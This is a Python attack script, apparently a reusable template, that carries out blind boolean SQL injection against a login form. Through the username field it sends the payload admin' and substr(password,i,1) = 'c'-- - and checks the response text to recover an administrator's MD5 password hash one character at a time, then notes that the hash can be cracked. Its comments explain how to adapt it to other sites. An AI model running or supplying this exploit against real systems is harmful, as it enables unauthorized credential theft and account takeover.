# Assumes that the SQLi parameter of the login field is the 'username' field and the content of the password field doesn't matter.
# Only goes from 0 - F for the character list because that's the character set of an MD5 hash.

import requests

chars = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f']

def GetSQL(i,c):
  # The text in the double quotes is the confirmed SQLi prefix and suffix.  In the example below, the prefix is admin' and the suffix is '-- -
  # The and substr(password,%s,1) = %s section should remain consistent as that is the SQL syntax to extract the hash.
  # The name of password in this syntax is the name of the password field in the back-end SQL DB.  You may have to adjust this name to different variations of what the password column could be named (pass, passwords, etc.).
  return "admin' and substr(password,%s,1) = '%s'-- -" % (i,c)

for i in range (1,33):
  for c in chars:
    injection = GetSQL(i,c)
    # May have to change the username and password text here to align with whatever the field names are in the HTTP POST request.
    payload = {'username':injection,'password':'Text'}
    r = requests.post('[IP/login page]', data = payload)
    # This is the text that is displayed on the return when we know that our injection was successful to show a character of the password hash for the indicated user.
    if "Wrong Identification" in r.text:
      print (c, end='', flush=True)
      break
print()

# This displays the MD5 hash of the password which we can then use to crack into the plaintext password.
